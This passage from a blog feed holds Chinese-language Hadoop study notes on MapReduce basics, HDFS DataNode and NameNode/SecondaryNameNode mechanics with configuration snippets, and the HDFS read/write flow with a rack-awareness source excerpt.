        <content type="html"><![CDATA[<h1 id="一：MapReduce-简介"><a href="#一：MapReduce-简介" class="headerlink" title="一：MapReduce 简介"></a>一：MapReduce 简介</h1><p>MapReduce 是一个<code>分布式运算程序的编程框架</code>，是用户开发“基于 Hadoop 的数据分析应用”的核心框架。</p><p>MapReduce 核心功能是将用户编写的<code>业务逻辑代码</code>和<code>自带默认组件</code>整合成一个完整的<code>分布式运算程序</code>，并发运行在一个 Hadoop 集群上。</p><h1 id="二：MapReduce-优缺点"><a href="#二：MapReduce-优缺点" class="headerlink" title="二：MapReduce 优缺点"></a>二：MapReduce 优缺点</h1><h2 id="2-1-优点"><a href="#2-1-优点" class="headerlink" title="2.1 优点"></a>2.1 优点</h2><h3 id="（1）MapReduce-易于编程"><a href="#（1）MapReduce-易于编程" class="headerlink" title="（1）MapReduce 易于编程"></a>（1）MapReduce 易于编程</h3><ul><li>它<code>简单的实现一些接口，就可以完成一个分布式程序</code>，这个分布式程序可以分布到大量 廉价的 PC 机器上运行。也就是说你写一个分布式程序，跟写一个简单的串行程序是一模一 样的。就是因为这个特点使得 MapReduce 编程变得非常流行。</li></ul><h3 id="（2）良好的扩展性"><a href="#（2）良好的扩展性" class="headerlink" title="（2）良好的扩展性"></a>（2）良好的扩展性</h3><ul><li>当你的计算资源不能得到满足的时候，你可以通过<code>简单的增加机器</code>来扩展它的计算能力。</li></ul><h3 id="（3）高容错性"><a href="#（3）高容错性" class="headerlink" title="（3）高容错性"></a>（3）高容错性</h3><ul><li>MapReduce 设计的初衷就是使程序能够部署在廉价的 PC 机器上，这就要求它具有很高 的容错性。比如<code>其中一台机器挂了，它可以把上面的计算任务转移到另外一个节点上运行， 不至于这个任务运行失败</code>，而且这个过程不需要人工参与，而完全是由 Hadoop 内部完成的。</li></ul><h3 id="（4）适合-PB-级以上海量数据的离线处理"><a href="#（4）适合-PB-级以上海量数据的离线处理" class="headerlink" title="（4）适合 PB 级以上海量数据的离线处理"></a>（4）适合 PB 级以上海量数据的离线处理</h3><ul><li>可以实现上千台服务器集群并发工作，提供数据处理能力。</li></ul><h2 id="2-2-缺点"><a href="#2-2-缺点" class="headerlink" title="2.2 缺点"></a>2.2 缺点</h2><h3 id="（1）不擅长实时计算"><a href="#（1）不擅长实时计算" class="headerlink" title="（1）不擅长实时计算"></a>（1）不擅长实时计算</h3><ul><li>MapReduce 无法像 MySQL 一样，在毫秒或者秒级内返回结果。</li></ul><h3 id="（2）不擅长流式计算"><a href="#（2）不擅长流式计算" class="headerlink" title="（2）不擅长流式计算"></a>（2）不擅长流式计算</h3><ul><li>流式计算的输入数据是动态的，而 <code>MapReduce 的输入数据集是静态的</code>，不能动态变化。 这是因为 MapReduce 自身的设计特点决定了数据源必须是静态的。</li></ul><h3 id="（3）不擅长-DAG（有向无环图）计算"><a href="#（3）不擅长-DAG（有向无环图）计算" class="headerlink" title="（3）不擅长 DAG（有向无环图）计算"></a>（3）不擅长 DAG（有向无环图）计算</h3><ul><li>多个应用程序存在依赖关系，<code>后一个应用程序的输入为前一个的输出</code>。在这种情况下， MapReduce 并不是不能做，而是使用后，每个 MapReduce 作业的输出结果都会写入到磁盘， 会造成大量的磁盘 IO，导致性能非常的低下。</li></ul><h1 id="三：MapReduce-核心思想"><a href="#三：MapReduce-核心思想" class="headerlink" title="三：MapReduce 核心思想"></a>三：MapReduce 核心思想</h1><p><img src="/blog/b6d0a624.html/image-20221216230005324.png"></p><p>（1）分布式的运算程序往往需要分成至少 2 个阶段。</p><p>（2）第一个阶段的 MapTask 并发实例，完全并行运行，互不相干。</p><p>（3）第二个阶段的 ReduceTask 并发实例互不相干，但是他们的数据依赖于上一个阶段 的所有 MapTask 并发实例的输出。</p><p>（4）MapReduce 编程模型只能包含一个 Map 阶段和一个 Reduce 阶段，如果用户的业 务逻辑非常复杂，那就只能多个 MapReduce 程序，串行运行。</p><h1 id="四：MapReduce-进程"><a href="#四：MapReduce-进程" class="headerlink" title="四：MapReduce 进程"></a>四：MapReduce 进程</h1><p>一个完整的 MapReduce 程序在分布式运行时有三类实例进程：</p><p>（1）MrAppMaster：负责整个程序的过程调度及状态协调。</p><p>（2）MapTask：负责 Map 阶段的整个数据处理流程。</p><p>（3）ReduceTask：负责 Reduce 阶段的整个数据处理流程。</p><h1 id="五：官方-WordCount-源码"><a href="#五：官方-WordCount-源码" class="headerlink" title="五：官方 WordCount 源码"></a>五：官方 WordCount 源码</h1><p>采用反编译工具反编译源码，发现 WordCount 案例有 Map 类、Reduce 类和驱动类。且数据的类型是 Hadoop 自身封装的序列化类型。</p><h1 id="六：常用数据序列化类型"><a href="#六：常用数据序列化类型" class="headerlink" title="六：常用数据序列化类型"></a>六：常用数据序列化类型</h1><p><img src="/blog/b6d0a624.html/image-20221216230422956.png"></p><h1 id="七：MapReduce-编程规范"><a href="#七：MapReduce-编程规范" class="headerlink" title="七：MapReduce 编程规范"></a>七：MapReduce 编程规范</h1><p>用户编写的程序分成三个部分：Mapper、Reducer 和 Driver。</p><h2 id="7-1-Mapper阶段"><a href="#7-1-Mapper阶段" class="headerlink" title="7.1 Mapper阶段"></a>7.1 Mapper阶段</h2><p>（1）用户自定义的Mapper要继承自己的父类</p><p>（2）Mapper的输入数据是KV对的形式（KV的类型可自定义）</p><p>（3）Mapper中的业务逻辑写在map()方法中</p><p>（4）Mapper的输出数据是KV对的形式（KV的类型可自定义）</p><p>（5）map()方法（MapTask进程）对每一个调用一次</p><h2 id="7-2-Reducer阶段"><a href="#7-2-Reducer阶段" class="headerlink" title="7.2 Reducer阶段"></a>7.2 Reducer阶段</h2><p>（1）用户自定义的Reducer要继承自己的父类</p><p>（2）Reducer的输入数据类型对应Mapper的输出数据类型，也是KV</p><p>（3）Reducer的业务逻辑写在reduce()方法中</p><p>（4）ReduceTask进程对每一组相同k的组调用一次reduce()方法</p><h2 id="7-3-Driver阶段"><a href="#7-3-Driver阶段" class="headerlink" title="7.3 Driver阶段"></a>7.3 Driver阶段</h2><p>相当于YARN集群的客户端，用于提交我们整个程序到YARN集群，提交的是 封装了MapReduce程序相关运行参数的job对象；</p>]]></content>
      
      
      <categories>
          
          <category> Hadoop </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hadoop </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HDFS DataNode</title>
      <link href="/blog/854ee684.html/"/>
      <url>/blog/854ee684.html/</url>
      
        <content type="html"><![CDATA[<h1 id="一：DataNode-工作机制"><a href="#一：DataNode-工作机制" class="headerlink" title="一：DataNode 工作机制"></a>一：DataNode 工作机制</h1><p><img src="/blog/854ee684.html/image-20221215160341892.png"></p><p>（1）一个数据块在 DataNode 上以文件形式存储在磁盘上，包括两个文件，一个是数据 本身，一个是元数据包括数据块的长度，块数据的校验和，以及时间戳。</p><p>（2）DataNode 启动后向 NameNode 注册，通过后，周期性（6 小时）的向 NameNode 上 报所有的块信息。</p><ul><li>DN 向 NN 汇报当前解读信息的时间间隔，默认 6 小时；</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>dfs.blockreport.intervalMsec<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">value</span>&gt;</span>21600000<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">description</span>&gt;</span>Determines block reporting interval in milliseconds.<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>DN 扫描自己节点块信息列表的时间，默认 6 小时；</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>dfs.datanode.directoryscan.interval<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">value</span>&gt;</span>21600s<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">description</span>&gt;</span>Interval in seconds for Datanode to scan data directories and reconcile the difference between blocks in memory and on the disk. Support multiple time unit suffix(case insensitive), as described in dfs.heartbeat.interval.<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br></pre></td></tr></table></figure><p>（3）心跳是每 3 秒一次，心跳返回结果带有 NameNode 给该 DataNode 的命令如复制块 数据到另一台机器，或删除某个数据块。如果超过 10 分钟没有收到某个 DataNode 的心跳， 则认为该节点不可用。</p><p>（4）集群运行中可以安全加入和退出一些机器。</p><h1 id="二：数据完整性"><a href="#二：数据完整性" class="headerlink" title="二：数据完整性"></a>二：数据完整性</h1><p><img src="/blog/854ee684.html/image-20221215160813980.png"></p><p>思考：如果电脑磁盘里面存储的数据是控制高铁信号灯的红灯信号（1）和绿灯信号（0）， 但是存储该数据的磁盘坏了，一直显示是绿灯，是否很危险？同理 DataNode 节点上的数据 损坏了，却没有发现，是否也很危险，那么如何解决呢？</p><p>如下是 DataNode 节点保证数据完整性的方法。</p><ol><li>当 DataNode 读取 Block 的时候，它会计算 CheckSum。</li><li>如果计算后的 CheckSum，与 Block 创建时值不一样，说明 Block 已经损坏。</li><li>Client 读取其他 DataNode 上的 Block。</li><li>常见的校验算法 crc（32），md5（128），sha1（160）；</li><li>DataNode 在其文件创建后周期验证 CheckSum。</li></ol><h1 id="三：掉线时限参数设置"><a href="#三：掉线时限参数设置" class="headerlink" title="三：掉线时限参数设置"></a>三：掉线时限参数设置</h1><p><img src="/blog/854ee684.html/image-20221215161115612.png"></p><ul><li>需要注意的是 hdfs-site.xml 配置文件中：<ul><li>heartbeat.recheck.interval 的单位为毫秒</li><li>dfs.heartbeat.interval 的单位为秒</li></ul></li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>dfs.namenode.heartbeat.recheck-interval<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>300000<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>dfs.heartbeat.interval<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>3<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Hadoop </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hadoop </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HDFS NameNode和SecondaryNameNode</title>
      <link href="/blog/a5404ebd.html/"/>
      <url>/blog/a5404ebd.html/</url>
      
        <content type="html"><![CDATA[<h1 id="一：NN-和-2NN-工作机制"><a href="#一：NN-和-2NN-工作机制" class="headerlink" title="一：NN 和 2NN 工作机制"></a>一：NN 和 2NN 工作机制</h1><h2 id="1-1-思考：NameNode-中的元数据是存储在哪里的？"><a href="#1-1-思考：NameNode-中的元数据是存储在哪里的？" class="headerlink" title="1.1 思考：NameNode 中的元数据是存储在哪里的？"></a>1.1 思考：NameNode 中的元数据是存储在哪里的？</h2><p>首先，我们做个假设，如果存储在 NameNode 节点的磁盘中，因为经常需要进行随机访 问，还有响应客户请求，必然是效率过低。因此，元数据需要存放在内存中。但如果只存在 内存中，一旦断电，元数据丢失，整个集群就无法工作了。因此产生在磁盘中备份元数据的 FsImage。</p><p>这样又会带来新的问题，当在内存中的元数据更新时，如果同时更新 FsImage，就会导 致效率过低，但如果不更新，就会发生一致性问题，一旦 NameNode 节点断电，就会产生数 据丢失。因此，引入 Edits 文件（只进行追加操作，效率很高）。每当元数据有更新或者添 加元数据时，修改内存中的元数据并追加到 Edits 中。这样，一旦 NameNode 节点断电，可 以通过 FsImage 和 Edits 的合并，合成元数据。</p><p>但是，如果长时间添加数据到 Edits 中，会导致该文件数据过大，效率降低，而且一旦 断电，恢复元数据需要的时间过长。因此，需要定期进行 FsImage 和 Edits 的合并，如果这 个操作由NameNode节点完成，又会效率过低。因此，引入一个新的节点SecondaryNamenode， 专门用于 FsImage 和 Edits 的合并。</p><h2 id="1-2-NameNode工作机制"><a href="#1-2-NameNode工作机制" class="headerlink" title="1.2 NameNode工作机制"></a>1.2 NameNode工作机制</h2><p><img src="/blog/a5404ebd.html/image-20221215152545774.png"></p><h3 id="（1）第一阶段：NameNode-启动"><a href="#（1）第一阶段：NameNode-启动" class="headerlink" title="（1）第一阶段：NameNode 启动"></a>（1）第一阶段：NameNode 启动</h3><ol><li>第一次启动 NameNode 格式化后，创建 Fsimage 和 Edits 文件。如果不是第一次启动，直接加载编辑日志和镜像文件到内存。</li><li>客户端对元数据进行增删改的请求。</li><li>NameNode 记录操作日志，更新滚动日志。</li><li>NameNode 在内存中对元数据进行增删改。</li></ol><h3 id="（2）第二阶段：Secondary-NameNode-工作"><a href="#（2）第二阶段：Secondary-NameNode-工作" class="headerlink" title="（2）第二阶段：Secondary NameNode 工作"></a>（2）第二阶段：Secondary NameNode 工作</h3><ol><li>Secondary NameNode 询问 NameNode 是否需要 CheckPoint。直接带回 NameNode 是否检查结果。</li><li>Secondary NameNode 请求执行 CheckPoint。</li><li>NameNode 滚动正在写的 Edits 日志。</li><li>将滚动前的编辑日志和镜像文件拷贝到 Secondary NameNode。</li><li>Secondary NameNode 加载编辑日志和镜像文件到内存，并合并。</li><li>生成新的镜像文件 fsimage.chkpoint。</li><li>拷贝 fsimage.chkpoint 到 NameNode。</li><li>NameNode 将 fsimage.chkpoint 重新命名成 fsimage。</li></ol><h1 id="二：Fsimage-和-Edits-解析"><a href="#二：Fsimage-和-Edits-解析" class="headerlink" title="二：Fsimage 和 Edits 解析"></a>二：Fsimage 和 Edits 解析</h1><h2 id="2-1-Fsimage和Edits概念"><a href="#2-1-Fsimage和Edits概念" class="headerlink" title="2.1 Fsimage和Edits概念"></a>2.1 Fsimage和Edits概念</h2><p>NameNode被格式化之后，将在&#x2F;opt&#x2F;module&#x2F;hadoop-3.3.4&#x2F;data&#x2F;tmp&#x2F;dfs&#x2F;name&#x2F;current目录中产生如下文件</p><p><img src="/blog/a5404ebd.html/image-20221215153208494.png"></p><ol><li>Fsimage文件：HDFS文件系统元数据的一个永久性的检查点，其中包含HDFS文件系统的所有目 录和文件inode的序列化信息。</li><li>Edits文件：存放HDFS文件系统的所有更新操作的路径，文件系统客户端执行的所有写操作首先 会被记录到Edits文件中。</li><li>seen_txid文件保存的是一个数字，就是最后一个edits_的数字</li><li>每 次NameNode启动的时候都会将Fsimage文件读入内存，加 载Edits里面的更新操作，保证内存 中的元数据信息是最新的、同步的，可以看成NameNode启动的时候就将Fsimage和Edits文件进行了合并。</li></ol><h2 id="2-2-oiv-查看-Fsimage-文件"><a href="#2-2-oiv-查看-Fsimage-文件" class="headerlink" title="2.2 oiv 查看 Fsimage 文件"></a>2.2 oiv 查看 Fsimage 文件</h2><ul><li>hdfs oiv -p 文件类型 -i 镜像文件 -o 转换后文件输出路径</li><li>pwd：&#x2F;opt&#x2F;module&#x2F;hadoop-3.3.4&#x2F;data&#x2F;dfs&#x2F;name&#x2F;current</li><li>hdfs oiv -p XML -i  fsimage_0000000000000000025 -o &#x2F;home&#x2F;ghost&#x2F;tmp&#x2F;fsimage.xml</li><li>思考：可以看出，Fsimage 中没有记录块所对应 DataNode，为什么？ </li><li>在集群启动后，要求 DataNode 上报数据块信息，并间隔一段时间后再次上报。</li></ul><h2 id="2-3-oev-查看-Edits-文件"><a href="#2-3-oev-查看-Edits-文件" class="headerlink" title="2.3 oev 查看 Edits 文件"></a>2.3 oev 查看 Edits 文件</h2><ul><li>hdfs oev -p 文件类型 -i 编辑日志 -o 转换后文件输出路径</li><li>pwd：&#x2F;opt&#x2F;module&#x2F;hadoop-3.3.4&#x2F;data&#x2F;dfs&#x2F;name&#x2F;current</li><li>hdfs oiv -p XML -i  edits_0000000000000000012-0000000000000000013 -o &#x2F;home&#x2F;ghost&#x2F;tmp&#x2F;edits.xml</li></ul><h1 id="三-：CheckPoint-时间设置"><a href="#三-：CheckPoint-时间设置" class="headerlink" title="三 ：CheckPoint 时间设置"></a>三 ：CheckPoint 时间设置</h1><h2 id="3-1-通常情况下，SecondaryNameNode-每隔一小时执行一次"><a href="#3-1-通常情况下，SecondaryNameNode-每隔一小时执行一次" class="headerlink" title="3.1 通常情况下，SecondaryNameNode 每隔一小时执行一次"></a>3.1 通常情况下，SecondaryNameNode 每隔一小时执行一次</h2><p>hdfs-default.xml 原始配置如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>dfs.namenode.checkpoint.period<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>3600s<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="3-2-一分钟检查一次操作次数，当操作次数达到-1-百万时，SecondaryNameNode-执行一次。"><a href="#3-2-一分钟检查一次操作次数，当操作次数达到-1-百万时，SecondaryNameNode-执行一次。" class="headerlink" title="3.2 一分钟检查一次操作次数，当操作次数达到 1 百万时，SecondaryNameNode 执行一次。"></a>3.2 一分钟检查一次操作次数，当操作次数达到 1 百万时，SecondaryNameNode 执行一次。</h2><p>hdfs-default.xml 原始配置如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>dfs.namenode.checkpoint.txns<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">value</span>&gt;</span>1000000<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">description</span>&gt;</span>操作动作次数<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>dfs.namenode.checkpoint.check.period<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">value</span>&gt;</span>60s<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span> 1 分钟检查一次操作次数<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Hadoop </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hadoop </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HDFS 读写流程</title>
      <link href="/blog/b08a5f1f.html/"/>
      <url>/blog/b08a5f1f.html/</url>
      
        <content type="html"><![CDATA[<h1 id="一：写数据流程"><a href="#一：写数据流程" class="headerlink" title="一：写数据流程"></a>一：写数据流程</h1><p><img src="/blog/b08a5f1f.html/image-20221215135840868.png"></p><p>（1）客户端通过 Distributed FileSystem 模块向 NameNode 请求上传文件，NameNode 检查目标文件是否已存在，父目录是否存在。</p><p>（2）NameNode 返回是否可以上传。</p><p>（3）客户端请求第一个 Block 上传到哪几个 DataNode 服务器上。</p><p>（4）NameNode 返回 3 个 DataNode 节点，分别为 dn1、dn2、dn3。</p><p>（5）客户端通过 FSDataOutputStream 模块请求 dn1 上传数据，dn1 收到请求会继续调用 dn2，然后 dn2 调用 dn3，将这个通信管道建立完成。</p><p>（6）dn1、dn2、dn3 逐级应答客户端。</p><p>（7）客户端开始往 dn1 上传第一个 Block（先从磁盘读取数据放到一个本地内存缓存）， 以 Packet 为单位，dn1 收到一个 Packet 就会传给 dn2，dn2 传给 dn3；dn1 每传一个 packet 会放入一个应答队列等待应答。</p><p>（8）当一个 Block 传输完成之后，客户端再次请求 NameNode 上传第二个 Block 的服务 器。（重复执行 3-7 步）。</p><h1 id="二：读数据流程"><a href="#二：读数据流程" class="headerlink" title="二：读数据流程"></a>二：读数据流程</h1><p><img src="/blog/b08a5f1f.html/image-20221215140417387.png"></p><p>（1）客户端通过 DistributedFileSystem 向 NameNode 请求下载文件，NameNode 通过查询元数据，找到文件块所在的 DataNode 地址。</p><p>（2）挑选一台 DataNode（就近原则，然后随机）服务器，请求读取数据。</p><p>（3）DataNode 开始传输数据给客户端（从磁盘里面读取数据输入流，以 Packet 为单位 来做校验）。</p><p>（4）客户端以 Packet 为单位接收，先在本地缓存，然后写入目标文件。</p><h1 id="三：网络拓扑-节点距离计算"><a href="#三：网络拓扑-节点距离计算" class="headerlink" title="三：网络拓扑-节点距离计算"></a>三：网络拓扑-节点距离计算</h1><p>在 HDFS 写数据的过程中，NameNode 会选择距离待上传数据最近距离的 DataNode 接 收数据。那么这个最近距离怎么计算呢？</p><p><strong>节点距离：两个节点到达最近的共同祖先的距离总和。</strong></p><p><img src="/blog/b08a5f1f.html/image-20221215141856696.png"></p><p>假设有数据中心 d1 机架 r1 中的节点 n1。该节点可以表示为&#x2F;d1&#x2F;r1&#x2F;n1。</p><p>两个数据中心依靠外部的网络连接，数据中心可看作一个机房。</p><h1 id="四：机架感知（副本存储节点选择）"><a href="#四：机架感知（副本存储节点选择）" class="headerlink" title="四：机架感知（副本存储节点选择）"></a>四：机架感知（副本存储节点选择）</h1><h2 id="4-1-机架感知说明"><a href="#4-1-机架感知说明" class="headerlink" title="4.1 机架感知说明"></a>4.1 机架感知说明</h2><p><a href="https://hadoop.apache.org/docs/r3.3.4/hadoop-project-dist/hadoop-hdfs/HdfsDesign.html#Data_Replication">Apache Hadoop 3.3.4 – HDFS Architecture</a></p><p>对于常见情况，当复制因子为3时，HDFS的放置策略是，如果编写器在datanode上，则将一个副本放在本地计算机上，否则放在与编写器在同一机架中的随机datanode上，另一个副本放在不同(远程)机架中的节点上，最后一个放在同一远程机架中的不同节点上。</p><p>此策略减少了机架间的写入流量，从而总体上提高了写入性能。机架故障的几率远小于节点故障的几率；该策略不影响数据可靠性和可用性保证。但是，它不会减少读取数据时使用的聚合网络带宽，因为数据块仅放置在两个不同的机架中，而不是三个。</p><p>使用这种策略，数据块的副本不会均匀分布在机架上。两个副本位于一个机架的不同节点上，另一个副本位于另一个机架的节点上。该策略提高了写入性能，而不影响数据可靠性或读取性能。</p><h2 id="4-2-源码说明"><a href="#4-2-源码说明" class="headerlink" title="4.2 源码说明"></a>4.2 源码说明</h2><p>Crtl + n 查找 BlockPlacementPolicyDefault，在该类中查找 chooseTargetInOrder 方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">   * Calculate the maximum number of replicas to allocate per rack. It also</span></span><br><span class="line"><span class="comment">   * limits the total number of replicas to the total number of nodes in the</span></span><br><span class="line"><span class="comment">   * cluster. Caller should adjust the replica count to the return value.</span></span><br><span class="line"><span class="comment">   *</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> numOfChosen The number of already chosen nodes.</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> numOfReplicas The number of additional nodes to allocate.</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@return</span> integer array. Index 0: The number of nodes allowed to allocate</span></span><br><span class="line"><span class="comment">   *         in addition to already chosen nodes.</span></span><br><span class="line"><span class="comment">   *         Index 1: The maximum allowed number of nodes per rack. This</span></span><br><span class="line"><span class="comment">   *         is independent of the number of chosen nodes, as it is calculated</span></span><br><span class="line"><span class="comment">   *         using the target number of replicas.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">private</span> <span class="type">int</span>[] getMaxNodesPerRack(<span class="type">int</span> numOfChosen, <span class="type">int</span> numOfReplicas) &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">clusterSize</span> <span class="operator">=</span> clusterMap.getNumOfLeaves();<span class="comment">//datanode的数量</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">totalNumOfReplicas</span> <span class="operator">=</span> numOfChosen + numOfReplicas;<span class="comment">//总共的副本数量</span></span><br><span class="line">    <span class="keyword">if</span> (totalNumOfReplicas &gt; clusterSize) &#123; <span class="comment">//如果总的数量大于集群datanode的数量</span></span><br><span class="line">      numOfReplicas -= (totalNumOfReplicas-clusterSize); <span class="comment">//修正副本的数量</span></span><br><span class="line">      totalNumOfReplicas = clusterSize; <span class="comment">//总的副本的数量等于集群datanode的数量</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// No calculation needed when there is only one rack or picking one node.//如果只有一个rack或者只选取一个结点，那么没有必要计算。</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">numOfRacks</span> <span class="operator">=</span> clusterMap.getNumOfRacks();</span><br><span class="line">    <span class="keyword">if</span> (numOfRacks == <span class="number">1</span> || totalNumOfReplicas &lt;= <span class="number">1</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">int</span>[] &#123;numOfReplicas, totalNumOfReplicas&#125;;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="type">int</span> <span class="variable">maxNodesPerRack</span> <span class="operator">=</span> (totalNumOfReplicas-<span class="number">1</span>)/numOfRacks + <span class="number">2</span>;<span class="comment">//如果totalNumOfReplicas-1 &lt; numOfRacks，那么maxNodesPerRack为2。</span></span><br><span class="line"><span class="comment">//如果totalNumOfReplicas - 1 = numOfRacks 那么 maxNodesPerRack=3，如果totalNumOfReplicas-1 &gt; numOfRacks，那么就在各机架平均分配值再加2。</span></span><br><span class="line"><span class="comment">// At this point, there are more than one racks and more than one replicas</span></span><br><span class="line">    <span class="comment">// to store. Avoid all replicas being in the same rack.</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// maxNodesPerRack has the following properties at this stage.</span></span><br><span class="line">    <span class="comment">//   1) maxNodesPerRack &gt;= 2</span></span><br><span class="line">    <span class="comment">//   2) (maxNodesPerRack-1) * numOfRacks &gt; totalNumOfReplicas</span></span><br><span class="line">    <span class="comment">//          when numOfRacks &gt; 1</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// Thus, the following adjustment will still result in a value that forces</span></span><br><span class="line">    <span class="comment">// multi-rack allocation and gives enough number of total nodes.</span></span><br><span class="line">    <span class="keyword">if</span> (maxNodesPerRack == totalNumOfReplicas) &#123;</span><br><span class="line">      maxNodesPerRack--;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">int</span>[] &#123;numOfReplicas, maxNodesPerRack&#125;;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h1 id="五：副本节点选择"><a href="#五：副本节点选择" class="headerlink" title="五：副本节点选择"></a>五：副本节点选择</h1><p><img src="/blog/b08a5f1f.html/image-20221215143227909.png"></p>]]></content>
      
      
      <categories>
          
          <category> Hadoop </category>
          
